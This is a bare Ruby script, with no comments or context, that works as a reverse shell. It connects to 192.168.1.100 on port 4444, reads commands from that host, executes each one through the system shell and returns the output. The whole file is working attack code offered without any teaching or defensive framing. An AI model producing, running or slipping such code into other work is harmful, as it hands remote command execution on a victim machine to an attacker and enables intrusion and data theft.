require 'socket'

client = TCPSocket.new('192.168.1.100', 4444)
loop do
    command = client.gets.chomp
    result = `#{command}`
    client.puts result
end